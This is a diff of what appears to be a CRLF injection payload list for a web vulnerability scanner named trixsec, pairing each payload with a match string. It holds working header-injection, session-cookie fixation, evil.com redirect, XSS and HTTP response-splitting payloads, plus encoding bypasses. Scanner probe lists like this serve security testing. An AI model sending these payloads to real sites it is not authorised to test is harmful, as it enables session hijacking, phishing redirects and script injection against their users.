@@ -1,29 +1,85 @@
-CRLF Injection with %0A::%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %0A%20::%0A%20Header-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %20%0A::%20%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %23%0A::%23%OAHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %E5%98%8A%E5%98%8D::%E5%98%8A%E5%98%8DHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %E5%98%8A%E5%98%8D%0A::%E5%98%8A%E5%98%8D%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %3F%0A::%3F%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %0D::%0DHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %0D%20::%0D%20Header-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %20%0D::%20%0DHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %23%0D::%23%0DHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %0D%0A::%0D%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %0D%0A%20::%0D%0A%20Header-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %20%0D%0A::%20%0D%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %23%0D%0A::%23%0D%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with \\r\\n::\\r\\nHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with suffix space \\r\\n:: \\r\\n Header-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %5cr%5cn::%5cr%5cnHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %E5%98%8A%E5%98%8D%0D%0A::%E5%98%8A%E5%98%8D%0D%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %0D%0A%09::%0D%0A%09Header-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %250A::%250AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %25250A::%25250AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %%0A0A::%%0A0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %25%30A::%25%30AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %25%30%61::%25%30%61Header-Test:trixsec::Header-Test:trixsec
-CRLF Injection with %u000A::%u000AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with open redirect chain %2F%2E%2E%0D%0A:://www.google.com/%2F%2E%2E%0D%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with open redirect chain %2E%2E%2F%0D%0A::/www.google.com/%2E%2E%2F%0D%0AHeader-Test:trixsec::Header-Test:trixsec
-CRLF Injection with open redirect chain %2F..%0D%0A::/google.com/%2F..%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+Basic CRLF header::%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF with space::%0A%20Header-Test:trixsec::Header-Test:trixsec
+CRLF with prefix space::%20%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF with hash::%23%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF with question::%3F%0AHeader-Test:trixsec::Header-Test:trixsec
+CR only::%0DHeader-Test:trixsec::Header-Test:trixsec
+CR with space::%0D%20Header-Test:trixsec::Header-Test:trixsec
+CR with prefix space::%20%0DHeader-Test:trixsec::Header-Test:trixsec
+CR with hash::%23%0DHeader-Test:trixsec::Header-Test:trixsec
+CRLF standard::%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF with space::%0D%0A%20Header-Test:trixsec::Header-Test:trixsec
+CRLF with prefix space::%20%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF with hash::%23%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+Unicode CRLF::%E5%98%8A%E5%98%8DHeader-Test:trixsec::Header-Test:trixsec
+Unicode CRLF with newline::%E5%98%8A%E5%98%8D%0AHeader-Test:trixsec::Header-Test:trixsec
+Set-Cookie basic::%0D%0ASet-Cookie:trixsec=cookie::Set-Cookie:trixsec
+Set-Cookie with attributes::%0D%0ASet-Cookie:trixsec=cookie; Path=/; HttpOnly::Set-Cookie:trixsec
+Set-Cookie session::%0D%0ASet-Cookie:sessionid=trixsec::Set-Cookie:sessionid
+Set-Cookie admin::%0D%0ASet-Cookie:admin=true::Set-Cookie:admin
+Location redirect::%0D%0ALocation:http://evil.com::Location:http
+Location HTTPS::%0D%0ALocation:https://evil.com::Location:https
+Location relative::%0D%0ALocation:/evil::Location:/evil
+Location with space::%0D%0A Location:http://evil.com::Location:http
+Content-Type HTML::%0D%0AContent-Type:text/html::Content-Type:text/html
+Content-Type JSON::%0D%0AContent-Type:application/json::Content-Type:application/json
+Content-Type XSS::%0D%0AContent-Type:text/html%0D%0A%0D%0A<script>alert(1)</script>::<script>
+Content-Type override::%0D%0AContent-Type:text/plain::Content-Type:text/plain
+Content-Length zero::%0D%0AContent-Length:0::Content-Length:0
+Content-Length large::%0D%0AContent-Length:999999::Content-Length:999999
+Content-Length negative::%0D%0AContent-Length:-1::Content-Length:-1
+Cache-Control no-cache::%0D%0ACache-Control:no-cache::Cache-Control:no-cache
+Cache-Control no-store::%0D%0ACache-Control:no-store::Cache-Control:no-store
+Cache-Control max-age::%0D%0ACache-Control:max-age=0::Cache-Control:max-age
+Cache-Control private::%0D%0ACache-Control:private::Cache-Control:private
+XSS script tag::%0D%0A%0D%0A<script>alert(1)</script>::<script>
+XSS img onerror::%0D%0A%0D%0A<img src=x onerror=alert(1)>::<img
+XSS iframe::%0D%0A%0D%0A<iframe src=javascript:alert(1)>::<iframe
+XSS body onload::%0D%0A%0D%0A<body onload=alert(1)>::<body
+Response split::%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:text/html%0D%0A%0D%0A<hacked>::hacked
+Response split 2::%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0A::HTTP/1.1
+Response split 3::%0A%0AHTTP/1.1%20200%20OK%0D%0A::HTTP/1.1
+Server header::%0D%0AServer:trixsec::Server:trixsec
+Server header 2::%0D%0AServer:Trixsec-Scanner::Server:Trixsec
+X-Powered-By::%0D%0AX-Powered-By:trixsec::X-Powered-By:trixsec
+WWW-Authenticate::%0D%0AWWW-Authenticate:Basic realm="trixsec"::WWW-Authenticate
+WWW-Authenticate 2::%0D%0AWWW-Authenticate:Bearer token=trixsec::WWW-Authenticate
+Pragma no-cache::%0D%0APragma:no-cache::Pragma:no-cache
+Pragma header::%0D%0APragma:trixsec::Pragma:trixsec
+Expires past::%0D%0AExpires:Thu, 01 Jan 1970 00:00:00 GMT::Expires:Thu
+Expires future::%0D%0AExpires:Wed, 31 Dec 2099 23:59:59 GMT::Expires:Wed
+X-Frame-Options deny::%0D%0AX-Frame-Options:DENY::X-Frame-Options:DENY
+X-Frame-Options sameorigin::%0D%0AX-Frame-Options:SAMEORIGIN::X-Frame-Options:SAMEORIGIN
+X-Frame-Options allow::%0D%0AX-Frame-Options:ALLOW-FROM::X-Frame-Options:ALLOW
+X-XSS-Protection disable::%0D%0AX-XSS-Protection:0::X-XSS-Protection:0
+X-XSS-Protection enable::%0D%0AX-XSS-Protection:1; mode=block::X-XSS-Protection:1
+CSP default::%0D%0AContent-Security-Policy:default-src 'none'::Content-Security-Policy
+CSP script::%0D%0AContent-Security-Policy:script-src 'unsafe-inline'::Content-Security-Policy
+Double encoded CRLF::%250D%250AHeader-Test:trixsec::Header-Test:trixsec
+Double encoded CR::%250DHeader-Test:trixsec::Header-Test:trixsec
+Double encoded LF::%250AHeader-Test:trixsec::Header-Test:trixsec
+Mixed encoding 1::%0D%250AHeader-Test:trixsec::Header-Test:trixsec
+Mixed encoding 2::%250D%0AHeader-Test:trixsec::Header-Test:trixsec
+URL encoded CRLF::%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+URL encoded CR::%0DHeader-Test:trixsec::Header-Test:trixsec
+URL encoded LF::%0AHeader-Test:trixsec::Header-Test:trixsec
+Raw CRLF::\r\nHeader-Test:trixsec::Header-Test:trixsec
+Raw CR::\rHeader-Test:trixsec::Header-Test:trixsec
+Raw LF::\nHeader-Test:trixsec::Header-Test:trixsec
+Escaped CRLF::\\r\\nHeader-Test:trixsec::Header-Test:trixsec
+Escaped CR::\\rHeader-Test:trixsec::Header-Test:trixsec
+Escaped LF::\\nHeader-Test:trixsec::Header-Test:trixsec
+Percent escaped::%5cr%5cnHeader-Test:trixsec::Header-Test:trixsec
+Percent escaped CR::%5crHeader-Test:trixsec::Header-Test:trixsec
+Percent escaped LF::%5cnHeader-Test:trixsec::Header-Test:trixsec
+UTF-7 CRLF::+ACk-+ADw-Header-Test:trixsec::Header-Test:trixsec
+UTF-7 variations::+ACk-+ADw-AFw-+AD4-::AFw
+Multi-line header::%0D%0AHeader-Test:trixsec%0D%0AHeader-Test2:trixsec2::Header-Test2
+Multi-line Set-Cookie::%0D%0ASet-Cookie:cookie1=value1%0D%0ASet-Cookie:cookie2=value2::Set-Cookie:cookie2
+Status 200::%0D%0AHTTP/1.1%20200%20OK::HTTP/1.1%20200
+Status 404::%0D%0AHTTP/1.1%20404%20Not%20Found::HTTP/1.1%20404
+Status 500::%0D%0AHTTP/1.1%20500%20Internal%20Server%20Error::HTTP/1.1%20500
+CORS wildcard::%0D%0AAccess-Control-Allow-Origin:*::Access-Control-Allow-Origin:*
+CORS specific::%0D%0AAccess-Control-Allow-Origin:http://evil.com::Access-Control-Allow-Origin:http
+CORS credentials::%0D%0AAccess-Control-Allow-Credentials:true::Access-Control-Allow-Credentials:true
+X-Content-Type nosniff::%0D%0AX-Content-Type-Options:nosniff::X-Content-Type-Options:nosniff
